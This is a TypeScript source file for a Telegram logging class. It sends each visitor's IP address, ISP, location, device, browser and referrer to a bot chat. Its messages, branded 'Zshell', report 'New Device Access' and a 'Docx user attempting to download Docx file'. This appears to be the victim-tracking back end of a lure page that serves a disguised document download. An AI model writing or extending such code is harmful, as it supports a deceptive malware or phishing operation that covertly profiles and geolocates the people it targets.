import axios from 'axios'
import { TelegramConfig } from '../types/api'

export class TelegramLogger {
  private config: TelegramConfig

  constructor(config: TelegramConfig) {
    this.config = config
  }

  async sendLog(message: string): Promise<void> {
    if (!this.config.botToken || !this.config.chatId) {
      console.log('⚠️ Telegram logging disabled - missing bot token or chat ID')
      return
    }

    // Fire-and-forget with timeout to prevent blocking operations
    const timeoutPromise = new Promise<never>((_, reject) => 
      setTimeout(() => reject(new Error('Timeout')), 5000)
    )

    const sendPromise = axios.post(
      `https://api.telegram.org/bot${this.config.botToken}/sendMessage`,
      {
        chat_id: this.config.chatId,
        text: message
      }
    )

    try {
      await Promise.race([sendPromise, timeoutPromise])
      console.log('✅ Telegram log sent successfully')
    } catch (error: any) {
      console.error('❌ Failed to send Telegram log:', error.message)
    }
  }

  formatDownloadLog(analytics: {
    ip: string
    userAgent: string
    referrer: string
    location: { country: string; city: string; isp: string }
    device: { type: string; browser: string; platform: string }
  }): string {
    const currentTime = new Date().toLocaleString('en-US', {
      timeZone: 'UTC',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    })

    const locationInfo = analytics.location.city !== 'Unknown' 
      ? `${analytics.location.city}, ${analytics.location.country}` 
      : analytics.location.country
    const ispInfo = analytics.location.isp !== 'Unknown' ? ` (${analytics.location.isp})` : ''

    return `🧛‍♂️ Zshell
📢 New Device Access
 DOCX CLIENT

🌍 IP: ${analytics.ip}${ispInfo}
🖥 Platform: ${analytics.device.platform}
🌐 Browser: ${analytics.device.browser}
🌎 Country: ${locationInfo}

🔵 Docx User attempting to download Docx file
📱 Device: ${analytics.device.type}
🌍 IP: ${analytics.ip}
🌐 Browser: ${analytics.device.browser}
📍 Location: ${locationInfo}
⏰ Time: ${currentTime}
🔄 Referrer: ${analytics.referrer || 'Direct'}

🔽 Docx user attempting to download Docx file for ${analytics.device.type} device

✅ Docx file download started successfully for ${analytics.device.type} device`
  }

  formatSuccessLog(analytics: {
    ip: string
    fileName: string
    location: { country: string; city: string }
    device: { type: string; browser: string }
  }): string {
    const locationInfo = analytics.location.city !== 'Unknown' 
      ? `${analytics.location.city}, ${analytics.location.country}` 
      : analytics.location.country

    return `✅ Download Completed Successfully
🧛‍♂️ Zshell - Success Report
🌍 IP: ${analytics.ip}
📍 Location: ${locationInfo}
📁 File: ${analytics.fileName}
📱 Device: ${analytics.device.type}
🌐 Browser: ${analytics.device.browser}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
  }

  formatErrorLog(analytics: {
    ip: string
    device: { type: string }
    error: string
  }): string {
    return `❌ Download Error
🧛‍♂️ Zshell - Error Report
🌍 IP: ${analytics.ip}
📱 Device: ${analytics.device.type}
❌ Error: ${analytics.error}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
  }
}